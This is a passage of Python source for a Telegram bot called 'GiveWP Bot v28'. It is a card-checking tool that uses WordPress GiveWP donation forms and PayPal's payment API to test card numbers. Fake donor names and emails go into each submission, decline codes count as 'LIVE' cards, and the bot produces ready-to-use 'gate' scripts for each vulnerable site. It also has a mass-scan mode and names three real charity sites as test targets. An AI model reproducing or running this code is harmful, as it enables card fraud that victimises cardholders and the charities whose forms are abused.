        self.ajax = f"{{self.base}}/wp-admin/admin-ajax.php"
        self.form1 = "{form1}"
        self.form2 = "{form2}"
        self.nonce = "{nonce}"
        self.pid = "{pid}"
        self.amt = "{amount}"
        self.au = None
        self.r = requests.Session()
        self.r.verify = False

    def _tok(self):
        try:
            r = self.r.get(self.url, headers={{"user-agent":UA}}, timeout=20, cookies=self.r.cookies)
            self.r.cookies.update(r.cookies)
            m = re.search(r'"data-client-token"\\s*:\\s*"([^"]+)"', r.text)
            if m:
                dec = base64.b64decode(m.group(1)).decode("utf-8", errors="ignore")
                au = re.search(r'"accessToken":"([^"]+)"', dec)
                if au: self.au = au.group(1); return True
            m = re.search(r'"accessToken"\\s*:\\s*"([^"]{{20,}})"', r.text)
            if m: self.au = m.group(1); return True
        except: pass
        return False

    def _data(self):
        return MultipartEncoder({{
            "give-honeypot":(None,""),"give-form-id-prefix":(None,self.form1),
            "give-form-id":(None,self.form2),"give-form-title":(None,""),
            "give-current-url":(None,self.url),"give-form-url":(None,self.url),
            "give-form-minimum":(None,"5.00"),"give-form-maximum":(None,"999999.99"),
            "give-form-hash":(None,self.nonce),"give-price-id":(None,self.pid),
            "give-amount":(None,self.amt),"payment-mode":(None,"paypal-commerce"),
            "give-gateway":(None,"paypal-commerce"),
            "give_first":(None,random.choice(["James","John"])),
            "give_last":(None,random.choice(["Smith","Johnson"])),
            "give_email":(None,f"u{{random.randint(1000,99999)}}@gmail.com"),
            "card_name":(None,"Test"),
        }})

    def _create(self):
        d = self._data()
        h = {{"content-type":d.content_type,"origin":self.base,"referer":self.url,"user-agent":UA}}
        try:
            r = self.r.post(self.ajax, params={{"action":"give_paypal_commerce_create_order"}},
                           headers=h, data=d, cookies=self.r.cookies, timeout=20)
            js = r.json()
            if isinstance(js.get("data"),dict) and js["data"].get("id"): return js["data"]["id"]
        except: pass
        return None

    def _confirm(self, oid, cc):
        p = cc.strip().split("|")
        n, mm, yy, cvc = p[0],p[1],p[2],p[3].strip()
        if "20" in yy: yy = yy.split("20")[1]
        if len(yy) == 4: yy = yy[2:]
        h = {{"authority":"cors.api.paypal.com","accept":"*/*",
              "authorization":f"Bearer {{self.au}}","braintree-sdk-version":SDK,
              "content-type":"application/json","origin":"https://assets.braintreegateway.com",
              "paypal-client-metadata-id":META,"referer":"https://assets.braintreegateway.com/",
              "user-agent":UA}}
        j = {{"payment_source":{{"card":{{"number":n,"expiry":f"20{{yy}}-{{mm}}",
              "security_code":cvc,"attributes":{{"verification":{{"method":"SCA_WHEN_REQUIRED"}}}}}}}},
              "application_context":{{"vault":False}}}}
        try: return self.r.post(f"https://cors.api.paypal.com/v2/checkout/orders/{{oid}}/confirm-payment-source",
                                headers=h, json=j, timeout=20)
        except: return None

    def _approve(self, oid):
        d = self._data()
        h = {{"content-type":d.content_type,"origin":self.base,"referer":self.url,"user-agent":UA}}
        try:
            return self.r.post(self.ajax, params={{"action":"give_paypal_commerce_approve_order","order":oid}},
                              headers=h, data=d, cookies=self.r.cookies, timeout=20)
        except: return None

    def charge(self, cc):
        if not self._tok(): return {{"status":"DEAD","code":"NO_TOKEN","raw":""}}
        oid = self._create()
        if not oid: return {{"status":"DEAD","code":"CREATE_FAILED","raw":""}}
        cr = self._confirm(oid, cc)
        if cr and cr.status_code in (400,422):
            for c in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS","PAYER_CANNOT_PAY",
                      "EXPIRED_CARD","CVV2_FAILURE","DO_NOT_HONOR","GENERIC_DECLINE"]:
                if c in cr.text.upper(): return {{"status":"LIVE","code":c,"raw":cr.text[:500]}}
        ar = self._approve(oid)
        if ar:
            try:
                js = json.loads(ar.text)
                if js.get("success") is True: return {{"status":"LIVE","code":"CHARGE_SUCCESS","raw":ar.text[:500]}}
            except: pass
            for c in ["ORDER_NOT_APPROVED","INSUFFICIENT_FUNDS","PAYER_CANNOT_PAY","CHARGE_SUCCESS"]:
                if c in ar.text.upper(): return {{"status":"LIVE","code":c,"raw":ar.text[:500]}}
        return {{"status":"DEAD","code":"FAILED","raw":""}}


if __name__ == "__main__":
    p = PayPal()
    r = p.charge("{test_card}")
    print(f"Status: {{r['status']}}")
    print(f"Code: {{r['code']}}")
'''


def gen_gate(url, dbg, card):
    info = dbg.get("extracted", {})
    p = urlparse(url)
    return GATE_TPL.format(domain=p.netloc, form_id=info.get("form_id","?"),
                            amount=dbg.get("amount","5.00"), meta=PAYPAL_META,
                            sdk=BRAINTREE_SDK, url=url, host=p.netloc,
                            path=p.path + ("?" + p.query if p.query else ""),
                            form1=info.get("form1",""), form2=info.get("form2",""),
                            nonce=info.get("nonce",""), pid=info.get("price_id","3"),
                            test_card=card)


@bot.message_handler(commands=["start"])
def start_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
    text = f"""<b>⚡ GiveWP Bot v28</b>

<b>Name:</b> {msg.from_user.first_name}
<b>ID:</b> <code>{msg.from_user.id}</code>

━━━━━━━━━━━━━━━━━━━━
/paypal <code>&lt;url&gt;</code>
/mass — ملف روابط
/test — فحص سريع
/stop — إيقاف
━━━━━━━━━━━━━━━━━━━━
🔥 Legendary 🔥"""
    safe_send(msg.chat.id, text, kb)


@bot.callback_query_handler(func=lambda c: c.data == "help")
def cb_help(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    text = """<b>📖 Help</b>

<code>/paypal URL</code> — فحص موقع
<code>/mass</code> — فحص ملف
<code>/test</code> — 3 مواقع
<code>/stop</code> — إيقاف

✅ LIVE = كارت اترفض (رد حقيقي)
❌ DEAD = فشل/gateway معطل"""
    try: bot.edit_message_text(text, call.message.chat.id, call.message.message_id)
    except: pass


@bot.callback_query_handler(func=lambda c: c.data == "fb")
def cb_fb(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("🔙 Back", callback_data="back"))
    try: bot.edit_message_text("💬 Send your message:", call.message.chat.id,
                               call.message.message_id, reply_markup=kb)
    except: pass
    waiting_users[call.from_user.id] = True


@bot.callback_query_handler(func=lambda c: c.data == "back")
def cb_back(call):
    try: bot.answer_callback_query(call.id)
    except: pass
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("📖 Help", callback_data="help"))
    kb.add(types.InlineKeyboardButton("💬 Feedback", callback_data="fb"))
    try: bot.edit_message_text("<b>⚡ GiveWP Bot</b>\n\nUse /start",
                               call.message.chat.id, call.message.message_id, reply_markup=kb)
    except: pass


@bot.message_handler(func=lambda m: m.from_user.id in waiting_users and not (m.text or "").startswith("/"))
def handle_fb(msg):
    waiting_users.pop(msg.from_user.id, None)
    kb = types.InlineKeyboardMarkup()
    kb.add(types.InlineKeyboardButton("Reply", callback_data=f"r_{msg.from_user.id}"))
    safe_send(OWNER_ID, f"📩 <b>Feedback</b>\nFrom: {msg.from_user.first_name}\nID: <code>{msg.from_user.id}</code>\n\n{msg.text[:500]}", kb)
    safe_send(msg.chat.id, "✅ Sent!")


@bot.callback_query_handler(func=lambda c: c.data.startswith("r_"))
def cb_reply(call):
    uid = int(call.data.split("_")[1])
    reply_mode[call.from_user.id] = uid
    try: bot.answer_callback_query(call.id)
    except: pass
    safe_send(call.from_user.id, "Write your reply:")


@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def handle_reply(msg):
    uid = reply_mode.pop(msg.from_user.id, None)
    if uid:
        safe_send(uid, f"<b>Admin:</b>\n\n{msg.text}")
        safe_send(msg.from_user.id, "✅ Sent")


@bot.message_handler(commands=["paypal"])
def paypal_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    parts = (msg.text or "").split(maxsplit=1)
    if len(parts) != 2:
        safe_send(msg.chat.id, "❌ /paypal URL"); return
    url = parts[1].strip()
    if not url.startswith(("http://","https://")):
        safe_send(msg.chat.id, "❌ Invalid URL"); return
    sm = safe_send(msg.chat.id, f"🔍 Scanning...\n<code>{url[:80]}</code>")
    if not sm: return
    def run():
        t0 = time.time()
        try:
            r = check(url, TEST_CARD)
            dt = time.time() - t0
            st, code, raw = r["status"], r["code"], r.get("raw","")
            dbg = r.get("debug",{})
            if st == "LIVE":
                gate = gen_gate(url, dbg, TEST_CARD)
                host = urlparse(url).netloc.replace(".","_")
                fn = f"gate_{host}_{int(time.time())}.py"
                safe_doc(msg.chat.id, gate.encode(), fn, f"✅ Gate: {fn}")
                info = dbg.get("extracted",{})
                report = f"""✅ <b>Gate Extracted!</b>
━━━━━━━━━━━━━━━━━
[⚡] Domain: <code>{urlparse(url).netloc}</code>
[⚡] Form: <code>{info.get("form_id","?")}</code>
[⚡] Amount: <code>${dbg.get("amount","?")}</code>
[⚡] Platform: <code>{dbg.get("platform","?")}</code>
[⚡] Time: <code>{datetime.now().strftime("%H:%M:%S")}</code>
━━━━━━━━━━━━━━━━━
🧪 <b>Gate Test:</b>
[⚡] Card: <code>{TEST_CARD[:10]}****</code>
[⚡] Response: <code>{code}</code>
[⚡] Status: ✅ LIVE
[⚡] Elapsed: <code>{dt:.1f}s</code>
━━━━━━━━━━━━━━━━━
📄 <b>Ready!</b>
📝 <b>Function:</b> <code>(cc)</code>
📌 <b>Format:</b> <code>cc|mm|yy|cvv</code>"""
                safe_edit(msg.chat.id, sm.message_id, report)
            else:
                txt = f"❌ <b>{st}</b> | <code>{code}</code>\n\n🔗 <code>{url[:100]}</code>\n⏱️ {dt:.1f}s"
                if raw: txt += f"\n\n📝 <code>{raw[:400]}</code>"
                safe_edit(msg.chat.id, sm.message_id, txt)
        except Exception as e:
            safe_edit(msg.chat.id, sm.message_id, f"❌ {str(e)[:200]}")
    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["test"])
def test_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    sites = [
        ("dandelions","https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"),
        ("stychno","https://www.stychnohumanitarianfoundation.com/donations/donation-form/"),
        ("svdp","https://svdpvenicefl.org/donations/donations/"),
    ]
    sm = safe_send(msg.chat.id, f"🔍 Testing {len(sites)}...")
    if not sm: return
    def run():
        results = []
        for n, u in sites:
            safe_edit(msg.chat.id, sm.message_id, f"🔍 {n}... ({len(results)}/{len(sites)})")
            r = check(u, TEST_CARD)
            results.append((n, r["status"], r["code"]))
        txt = "<b>📊 Results:</b>\n\n"
        for n, s, c in results:
            txt += f"{'✅' if s=='LIVE' else '❌'} <b>{n}</b>: {c}\n"
        safe_edit(msg.chat.id, sm.message_id, txt)
    threading.Thread(target=run, daemon=True).start()


@bot.message_handler(commands=["mass"])
def mass_cmd(msg):
    if is_blocked(msg.from_user.id):
        safe_send(msg.chat.id, "🚫 Blocked."); return
    sm = safe_send(msg.chat.id, "📁 Send .txt file (URLs per line)")
    if sm: bot.register_next_step_handler(sm, handle_mass)


def handle_mass(msg):
    if not msg.document:
        safe_send(msg.chat.id, "❌ Not a file"); return
    try:
        fi = bot.get_file(msg.document.file_id)
        data = bot.download_file(fi.file_path)
        links = [l.strip() for l in data.decode("utf-8",errors="ignore").splitlines() if l.strip()]
        if not links:
            safe_send(msg.chat.id, "❌ Empty"); return
        uid = msg.from_user.id; chat = msg.chat.id; total = len(links)
        processing_status[uid] = {"stop":False,"done":False,"live":0,"dead":0,
                                   "current":"","total":total,"processed":0}
        sm = safe_send(chat, f"📊 Scanning {total}...")
        if not sm: return
        def updater():
            last = ""
            while True:
                time.sleep(8)
                try:
                    if processing_status[uid]["done"]: break
                    st = processing_status[uid]
                    pct = int(st["processed"]/total*100) if total else 0
                    bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                    txt = f"""📊 <b>Scanning...</b>
━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {st["live"]}
❌ Dead: {st["dead"]}
⏳ {pct}% {bar}
🔗 <code>{st["current"][:60]}</code>
━━━━━━━━━━━━━━━━━
⏱️ {st["processed"]}/{total}
🛑 /stop"""
                    if txt != last:
                        try: bot.edit_message_text(txt, chat, sm.message_id); last = txt
                        except: pass
                except: pass
        threading.Thread(target=updater, daemon=True).start()
        def worker():
            for i, link in enumerate(links):
                if processing_status[uid].get("stop"): break
                processing_status[uid]["current"] = link
                try:
                    r = check(link, TEST_CARD)
                    processing_status[uid]["processed"] += 1
                    if r["status"] == "LIVE":
                        processing_status[uid]["live"] += 1
                        gate = gen_gate(link, r.get("debug",{}), TEST_CARD)
                        host = urlparse(link).netloc.replace(".","_")
                        fn = f"gate_{host}_{int(time.time())}.py"
                        safe_doc(chat, gate.encode(), fn, f"✅ {link[:60]}\n📄 {fn}")
                    else:
                        processing_status[uid]["dead"] += 1
                except: pass
            processing_status[uid]["done"] = True
            st = processing_status[uid]
            final = f"""📊 <b>Done!</b>
━━━━━━━━━━━━━━━━━
📌 Total: {total}
✅ Live: {st["live"]}
❌ Dead: {st["dead"]}
💯 Rate: {int(st["live"]/total*100) if total else 0}%"""
            safe_edit(chat, sm.message_id, final)
        threading.Thread(target=worker, daemon=True).start()
    except Exception as e:
        safe_send(msg.chat.id, f"❌ {str(e)[:100]}")


@bot.message_handler(commands=["stop"])
def stop_cmd(msg):
    uid = msg.from_user.id
    if uid in processing_status:
        processing_status[uid]["stop"] = True
        safe_send(msg.chat.id, "🛑 Stopping...")
    else:
        safe_send(msg.chat.id, "❌ No active process")


@bot.message_handler(commands=["block2"])
def block_cmd(msg):
    if str(msg.from_user.id) not in ADMINS:
        safe_send(msg.chat.id, "🚫 No permission"); return
    try:
        uid = msg.text.split()[1]
        with open("blockusers.txt","a") as f: f.write(f"{uid}\n")
        safe_send(msg.chat.id, f"✅ Blocked {uid}")
    except: safe_send(msg.chat.id, "Usage: /block2 ID")


@bot.message_handler(commands=["unblock2"])
def unblock_cmd(msg):
    if str(msg.from_user.id) not in ADMINS:
        safe_send(msg.chat.id, "🚫 No permission"); return
    try:
        uid = msg.text.split()[1]
        with open("blockusers.txt") as f: lines = f.readlines()
        with open("blockusers.txt","w") as f:
            for l in lines:
                if l.strip() != uid: f.write(l)
        safe_send(msg.chat.id, f"✅ Unblocked {uid}")
    except: safe_send(msg.chat.id, "Usage: /unblock2 ID")


if __name__ == "__main__":
    print("🔥 GiveWP Bot v28 — Complete")
    print(f"Playwright: {'✅' if HAS_PW else '❌'}")
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30, skip_pending=True)
        except KeyboardInterrupt:
            print("⏹️ Stopped"); break
        except Exception as e:
            err = str(e)
            if "409" in err or "Conflict" in err:
                print(f"⚠️ 409 — 15s"); time.sleep(15); continue
            print(f"❌ {err[:100]}"); time.sleep(5)
